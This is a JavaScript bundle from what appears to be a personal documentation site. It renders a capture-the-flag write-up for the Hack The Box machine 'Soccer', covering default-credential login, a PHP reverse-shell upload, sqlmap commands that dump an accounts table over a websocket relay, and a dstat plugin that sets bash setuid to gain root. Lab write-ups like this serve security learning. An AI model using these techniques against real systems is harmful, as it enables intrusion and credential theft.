"use strict";(self.webpackChunk_2h3ph3rd_github_io=self.webpackChunk_2h3ph3rd_github_io||[]).push([[6094],{3905:(e,t,n)=>{n.d(t,{Zo:()=>c,kt:()=>m});var a=n(7294);function s(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function r(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?r(Object(n),!0).forEach((function(t){s(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):r(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,a,s=function(e,t){if(null==e)return{};var n,a,s={},r=Object.keys(e);for(a=0;a<r.length;a++)n=r[a],t.indexOf(n)>=0||(s[n]=e[n]);return s}(e,t);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(a=0;a<r.length;a++)n=r[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(s[n]=e[n])}return s}var o=a.createContext({}),p=function(e){var t=a.useContext(o),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},c=function(e){var t=p(e.components);return a.createElement(o.Provider,{value:t},e.children)},u="mdxType",h={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},d=a.forwardRef((function(e,t){var n=e.components,s=e.mdxType,r=e.originalType,o=e.parentName,c=l(e,["components","mdxType","originalType","parentName"]),u=p(n),d=s,m=u["".concat(o,".").concat(d)]||u[d]||h[d]||r;return n?a.createElement(m,i(i({ref:t},c),{},{components:n})):a.createElement(m,i({ref:t},c))}));function m(e,t){var n=arguments,s=t&&t.mdxType;if("string"==typeof e||s){var r=n.length,i=new Array(r);i[0]=d;var l={};for(var o in t)hasOwnProperty.call(t,o)&&(l[o]=t[o]);l.originalType=e,l[u]="string"==typeof e?e:s,i[1]=l;for(var p=2;p<r;p++)i[p]=n[p];return a.createElement.apply(null,i)}return a.createElement.apply(null,n)}d.displayName="MDXCreateElement"},297:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>o,contentTitle:()=>i,default:()=>g,frontMatter:()=>r,metadata:()=>l,toc:()=>p});var a=n(7462),s=(n(7294),n(3905));const r={},i="Soccer",l={unversionedId:"writeups/htb/soccer",id:"writeups/htb/soccer",title:"Soccer",description:"A writeup for the HTB machine Soccer",source:"@site/docs/writeups/htb/soccer.md",sourceDirName:"writeups/htb",slug:"/writeups/htb/soccer",permalink:"/docs/writeups/htb/soccer",draft:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/writeups/htb/soccer.md",tags:[],version:"current",frontMatter:{},sidebar:"writeupsSidebar",previous:{title:"Precious",permalink:"/docs/writeups/htb/precious"},next:{title:"Cat Pictures 2",permalink:"/docs/writeups/thm/challenges/cat-pictures-2"}},o={},p=[{value:"User flag",id:"user-flag",level:2},{value:"Scanning",id:"scanning",level:3},{value:"Website analysis",id:"website-analysis",level:3},{value:"Website enumeration",id:"website-enumeration",level:3},{value:"Entering Tiny File\xa0Manager",id:"entering-tiny-filemanager",level:3},{value:"Exploiting the file upload vulnerability in\xa0Tiny",id:"exploiting-the-file-upload-vulnerability-intiny",level:3},{value:"Inside the\xa0system",id:"inside-thesystem",level:3},{value:"Second website",id:"second-website",level:3},{value:"SQLMap over websocket",id:"sqlmap-over-websocket",level:3},{value:"Running SQLmap",id:"running-sqlmap",level:3},{value:"User flag",id:"user-flag-1",level:3},{value:"Root flag",id:"root-flag",level:2},{value:"Privilege escalation",id:"privilege-escalation",level:3},{value:"Exploiting dstat",id:"exploiting-dstat",level:3},{value:"Root flag",id:"root-flag-1",level:3}],c=e=>function(t){return console.warn("Component "+e+" was not imported, exported, or provided by MDXProvider as global scope"),(0,s.kt)("div",t)},u=c("Image"),h=c("Gist"),d={toc:p},m="wrapper";function g(e){let{components:t,...n}=e;return(0,s.kt)(m,(0,a.Z)({},d,n,{components:t,mdxType:"MDXLayout"}),(0,s.kt)("h1",{id:"soccer"},"Soccer"),(0,s.kt)("blockquote",null,(0,s.kt)("p",{parentName:"blockquote"},"A writeup for the HTB machine Soccer")),(0,s.kt)("p",null,"Soccer is a HTB machine that requires different types of attack for the user flag. On the other hand, the path to root access is relatively straightforward."),(0,s.kt)("p",null,"In this writeup there are enumeration with gobuster, upload vulnerability with php reverse shell and sqlmap over websocket using a script."),(0,s.kt)(u,{src:"/images/writeups/htb/soccer/banner.png",mdxType:"Image"}),(0,s.kt)("h2",{id:"user-flag"},"User flag"),(0,s.kt)("h3",{id:"scanning"},"Scanning"),(0,s.kt)("p",null,"Use nmap to scan for services."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-bash"},"nmap -sS <IP>\n")),(0,s.kt)(u,{src:"/images/writeups/htb/soccer/nmap-scan.png",mdxType:"Image"}),(0,s.kt)("p",null,"We can see three services: ssh, http, and one on port 9091 used for websockets."),(0,s.kt)("h3",{id:"website-analysis"},"Website analysis"),(0,s.kt)("p",null,"If we look on the website there is only a simple homepage with no other links."),(0,s.kt)(u,{src:"/images/writeups/htb/soccer/website.png",mdxType:"Image"}),(0,s.kt)("h3",{id:"website-enumeration"},"Website enumeration"),(0,s.kt)("p",null,"By enumerating the main website using gobuster we can find a subdomain called tiny."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-bash"},"gobuster dir -u soccer.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n")),(0,s.kt)(u,{src:"/images/writeups/htb/soccer/gobuster.png",mdxType:"Image"}),(0,s.kt)("h3",{id:"entering-tiny-filemanager"},"Entering Tiny File\xa0Manager"),(0,s.kt)("p",null,"A page is found under /tiny. There is a login but common credentials don't work."),(0,s.kt)("p",null,'It is possible to search online for "Tiny File Manager" and the Github repository of this project is one of the first results.'),(0,s.kt)("p",null,"There is a section in the public documentation about the default admin credentials. The second user works. It is possible to enter inside."),(0,s.kt)("p",null,"Default credentials:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"username: user\npassword: 12345\n")),(0,s.kt)("p",null,(0,s.kt)("a",{parentName:"p",href:"https://github.com/prasathmani/tinyfilemanager/wiki/Security-and-User-Management"},"https://github.com/prasathmani/tinyfilemanager/wiki/Security-and-User-Management")),(0,s.kt)(u,{src:"/images/writeups/htb/soccer/tiny.png",mdxType:"Image"}),(0,s.kt)("h3",{id:"exploiting-the-file-upload-vulnerability-intiny"},"Exploiting the file upload vulnerability in\xa0Tiny"),(0,s.kt)("p",null,"Because it is a php server and we can upload file, we can obtain a reverse shell by uploading something like this and executing it."),(0,s.kt)("p",null,(0,s.kt)("a",{parentName:"p",href:"https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php"},"https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php")),(0,s.kt)(u,{src:"/images/writeups/htb/soccer/upload.png",mdxType:"Image"}),(0,s.kt)("h3",{id:"inside-thesystem"},"Inside the\xa0system"),(0,s.kt)("p",null,"Once inside we can see that we have no access as the main user or the root."),(0,s.kt)("p",null,"Also, no vulnerabilities are found with tools like LinPeas or LinEnum."),(0,s.kt)("p",null,"By looking in the available files we can find in the nginx config that there is an additional website as soc-player.soccer.htb."),(0,s.kt)(u,{src:"/images/writeups/htb/soccer/nginx.png",mdxType:"Image"}),(0,s.kt)("h3",{id:"second-website"},"Second website"),(0,s.kt)("p",null,"Once logged in the second website, there is only an input box."),(0,s.kt)("p",null,'By trying different inputs we can see that the message "Tickets exists" is show when the query is correct and a value is found.'),(0,s.kt)("p",null,"This is a blind sql injection vulnerability."),(0,s.kt)(u,{src:"/images/writeups/htb/soccer/sqli.png",mdxType:"Image"}),(0,s.kt)("h3",{id:"sqlmap-over-websocket"},"SQLMap over websocket"),(0,s.kt)("p",null,"The vulnerable request is managed with websockets so it is not possible to use sqlmap directly."),(0,s.kt)("p",null,"By looking to Rayhan0x01 post there is a possible solution for this."),(0,s.kt)("p",null,(0,s.kt)("a",{parentName:"p",href:"https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html"},"https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html")),(0,s.kt)("p",null,"We can create a middle server that receives normal GET requests by sqlmap and sent them to the websockets server and vice versa."),(0,s.kt)("p",null,"Once the script is ready and the server up and running, we can execute sqlmap and enumerate the database."),(0,s.kt)("p",null,"Run it with ",(0,s.kt)("inlineCode",{parentName:"p"},"flask run")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-bash"},"python3 -m venv .venv\nsource .venv/bin/activate\npython3 -m pip install flask websocket\n")),(0,s.kt)(h,{id:"23988dbb8c44b3885f7f488caba89414",mdxType:"Gist"}),(0,s.kt)("h3",{id:"running-sqlmap"},"Running SQLmap"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-bash"},'# enumerate dbs\nsqlmap -u "http://localhost:5000/?id=1" --batch --dbs\n\n# enumerate tables in app db\nsqlmap -u "http://localhost:5000/?id=1" --batch -D soccer_db --tables\n\n# enumerate credentials\nsqlmap -u "http://localhost:5000/?id=1" -D soccer_db -T accounts -C username,email,password --dump\n')),(0,s.kt)(u,{src:"/images/writeups/htb/soccer/sqlmap.png",mdxType:"Image"}),(0,s.kt)("h3",{id:"user-flag-1"},"User flag"),(0,s.kt)("p",null,"We can enter inside the system using ssh and the credentials found in the database. It is possible in this way to read the user flag."),(0,s.kt)(u,{src:"/images/writeups/htb/soccer/user.png",mdxType:"Image"}),(0,s.kt)("h2",{id:"root-flag"},"Root flag"),(0,s.kt)("h3",{id:"privilege-escalation"},"Privilege escalation"),(0,s.kt)("p",null,"Once inside the system for privilige escalation we can run LinPeas. Move it using ssh or by serving a directory."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-bash"},"./LinPeas.sh\n")),(0,s.kt)("p",null,(0,s.kt)("a",{parentName:"p",href:"https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS"},"https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS")),(0,s.kt)("p",null,"In the final output of LinPeas we can see that there is a possible vulnerability with dstat."),(0,s.kt)(u,{src:"/images/writeups/htb/soccer/linpeas.png",mdxType:"Image"}),(0,s.kt)("h3",{id:"exploiting-dstat"},"Exploiting dstat"),(0,s.kt)("p",null,"dstat can be run as root. We could write a new plugin to make some actions like the root inside the system."),(0,s.kt)("p",null,"New plugins can be written inside the folder ",(0,s.kt)("inlineCode",{parentName:"p"},"/usr/local/share/dstat"),"."),(0,s.kt)("p",null,"The filename format should be ",(0,s.kt)("inlineCode",{parentName:"p"},"dstat_<plugin_name>.py")," like ",(0,s.kt)("inlineCode",{parentName:"p"},"dstat_hack.py"),"."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-python"},"# /usr/local/share/dstat/dstat_hack.py\nimport os\n\nos.system('chmod +s /usr/bin/bash') # setuid\n")),(0,s.kt)("p",null,"We can run it using this command"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-bash"},"sudo /usr/bin/dstat --hack\n")),(0,s.kt)("h3",{id:"root-flag-1"},"Root flag"),(0,s.kt)("p",null,"Now we can run bash as root and read the flag."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-bash"},"bash -p\n")),(0,s.kt)(u,{src:"/images/writeups/htb/soccer/root.png",mdxType:"Image"}))}g.isMDXComponent=!0}}]);